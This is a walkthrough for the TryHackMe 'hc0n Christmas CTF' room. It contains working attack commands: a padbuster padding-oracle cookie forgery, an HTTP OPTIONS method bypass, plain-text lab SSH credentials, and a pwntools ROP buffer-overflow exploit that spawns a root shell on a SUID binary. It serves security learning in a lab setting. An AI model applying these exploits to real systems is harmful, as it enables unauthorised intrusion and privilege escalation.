# [hc0n Christmas CTF](https://tryhackme.com/room/hc0nchristmasctf)

## hackt the planet

### What is the user flag?

1. First, enumerate available ports with nmap to identify running services

```bash
nmap IP
```

![SCREEN01](https://github.com/user-attachments/assets/a102ff30-5800-4ff5-8814-9ed7ef89d43a)

2. Visiting the web service at `http://IP:8080`, we discover a ciphertext **RwO9+7tuGJ3nc1cIhN4E31WV/qeYGLURrcS7K+Af85w=**. This appears to be Base64-encoded, likely AES-encrypted data that we'll need to decrypt later

3. Enumerate directories on the web server with gobuster to discover hidden paths

```bash
gobuster dir -u IP -w /root/Desktop/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt
```

![SCREEN02](https://github.com/user-attachments/assets/47673379-ac6f-494c-955d-f133688ed568)

4. Examining `http://IP/robots.txt` provides valuable information:

   - Admin username: **administratorhc0nwithyhackme**
   - Reference to an image at `http://IP/iv.png`

5. The image at `http://IP/iv.png` contains text encoded with the Cicada 3301 cipher. Using the translation tables from [uncovering-cicada.fandom](https://uncovering-cicada.fandom.com/wiki/How_the_solved_pages_of_the_Liber_Primus_were_solved), we can decrypt it:

   - Decrypted text: **THEIVFORINGEOAEY**
   - This appears to be the Initialization Vector (IV) needed for AES decryption

6. Register a new account at `http://IP/register.php` and examine the cookies:

   - In your browser, open DevTools -> Storage -> Cookies

7. Use padbuster to perform a Padding Oracle Attack and forge a cookie for the admin user (select option **2** when prompted)

```bash
padbuster http://IP/login.php "COOKIE_VALUE" 8 --cookies hcon=COOKIE_VALUE --encoding 0 -plaintext user=administratorhc0nwithyhackme
```

![SCREEN03](https://github.com/user-attachments/assets/a7f5b0ea-8d7a-4af2-b3ad-0f570e2c9e90)

8. Replace your existing cookie with the newly generated encrypted value, then refresh the page:
   - In the admin panel, you'll find the SecretKeySpec: **hconkwithyhackme**
   - This is the encryption key needed to decrypt the AES ciphertext

![SCREEN04](https://github.com/user-attachments/assets/d6e1924d-f1e6-439f-9017-4fe48e7cbb9e)

9. With all required elements now collected, we can decrypt the ciphertext from step 2:
   - Visit [AES decryption site](https://www.devglan.com/online-tools/aes-encryption-decryption)
   - Input the ciphertext: `RwO9+7tuGJ3nc1cIhN4E31WV/qeYGLURrcS7K+Af85w=`
   - Key: `hconkwithyhackme`
   - IV: `THEIVFORINGEOAEY`
   - Mode: CBC
   - Key Size: 128 bits
   - Output Text Format: Text
   - The decrypted value reveals the SSH username: **thedarktangent**

![SCREEN05](https://github.com/user-attachments/assets/05234f3f-a35e-4150-8348-36af4660e5f6)

10. Continuing with directory enumeration, investigate `http://IP/hide-folders/`:

    - This directory contains two subdirectories: `/1/` and `/2/`
    - Accessing `/1/` results in a "Method Not Allowed" error

11. To bypass the method restriction on `/1/`:
    - In DevTools, right-click the `http://IP/hide-folders/1/` request
    - Select "Edit and Resend"
    - Change the HTTP method from `GET` to `OPTIONS`
    - This reveals the first part of the SSH password: **Gf7MRr55**

![SCREEN06](https://github.com/user-attachments/assets/e711c1d8-920c-420b-96a0-a0be792b3ba8)

12. To obtain the second part of the password, download the file from `http://IP/hide-folders/2/`:
    - The executable prompts for a username and password
    - Use the credentials found in the strings output: **stuxnet:n$@#PDuliL**
    - After login, it reveals the second part of the SSH password: **n$@#PDuliL**

```bash
chmod +x hola
strings hola
./hola
# login with stuxnet:n$@#PDuliL
```

![SCREEN07](https://github.com/user-attachments/assets/0a91af5e-b435-4c71-90df-0e6169667518)
![SCREEN08](https://github.com/user-attachments/assets/7ef79b55-3a75-4bb1-8121-84c628fcf8cf)

13. Put together the password parts and login via SSH to obtain the user flag

```bash
ssh thedarktangent@IP
# Password: Gf7MRr55n$@#PDuliL
cat user.txt
```

![SCREEN09](https://github.com/user-attachments/assets/626ef445-ab9a-4cde-a11b-167cbcf930dc)

---

### What is the root flag?

1. Search for potential privilege escalation vectors by identifying SUID binaries:
   - this will be the `home/thedarktangent/hc0n`

```bash
find / -perm -u=s -type f 2>/dev/null
```

![SCREEN10](https://github.com/user-attachments/assets/efca6f69-2af7-4dd5-a07e-3936a334306a)

2. Transfer the binary to our attacking machine for analysis:

```bash
# On target machine
python3 -m http.server
```

![SCREEN11](https://github.com/user-attachments/assets/5169e3c1-c865-4bfd-a374-f2997c0cafb2)

```bash
# On attacking machine
wget http://IP:8000/hc0n
```

![SCREEN12](https://github.com/user-attachments/assets/0a1c2c49-b1a6-4d8c-bda9-e24a2ec976cc)

3. Test the binary for buffer overflow vulnerabilities
   - The program crashes with a **SIGSEGV, Segmentation fault**, confirming it's vulnerable to buffer overflow.

```bash
python -c "print 'A'*200" > A.in
gdb hc0n
r < A.in
```

![SCREEN13](https://github.com/user-attachments/assets/c8dabd4a-4f01-4e77-8184-19892b76b69a)

4. Generate a unique pattern to identify the exact offset needed:

```bash
/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 200
```

![SCREEN14](https://github.com/user-attachments/assets/e968bb16-149d-4ab1-8b4a-45a6f9447e5a)

5. Use the generated pattern in GDB to find the exact crash point:

```bash
gdb -q hc0n
r
# When prompted, paste the generated pattern
x $rbp
# Note the value in RBP register
```

![SCREEN15](https://github.com/user-attachments/assets/65fccb28-4d9a-419b-a4e5-33f971875caa)

6. Calculate the precise offset:

```bash
/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -q 0x6241376241366241
```

![SCREEN16](https://github.com/user-attachments/assets/5081deed-675f-41b6-8311-b7d1f9c251d5)

7. Create and test a payload to verify our control of the instruction pointer

```bash
python -c "print('A'*56 + '\x43\x43\x42\x42\xfe\xfe\xff\xff')" > payload.in

gdb hc0n
r < payload.in
```

![SCREEN17](https://github.com/user-attachments/assets/6a913517-af25-411a-8ad8-1e133bceb9b4)

8. Create [an exploit](https://deskel.github.io/posts/thm/hc0n-christmas-ctf) using pwntools to gain a root shell

```python
from pwn import *
import sys

HOST = "IP"
PORT = 22

def SROP_exploit(r):
	pop_rax = 0x40061f
	pop_rdi = 0x400604
	pop_rsi = 0x40060d
	pop_rdx = 0x400616
	bin_sh = 0x4006f8
	syscall = 0x4005fa

	payload = "A"*56
	payload += p64(pop_rax)
	payload += p64(59)
	payload += p64(pop_rdi)
	payload += p64(bin_sh)
	payload += p64(pop_rsi)
	payload += p64(0x0)
	payload += p64(pop_rdx)
	payload += p64(0x0)
	payload += p64(syscall)

	print(r.recvline())
	r.sendline(payload)
	r.interactive()

if __name__== "__main__":
	r = ssh(host=HOST, port=PORT, user="USERNAME", password="PASSWORD")
	s = r.run('./hc0n')
	SROP_exploit(s)
```

9. Run the exploit and obtain the root flag

```bash
pip install pwntools
python script.py

whoami
cat /root/root.txt
```

![SCREEN18](https://github.com/user-attachments/assets/9a379784-7cd1-44e9-bf47-af4a8ace7e49)
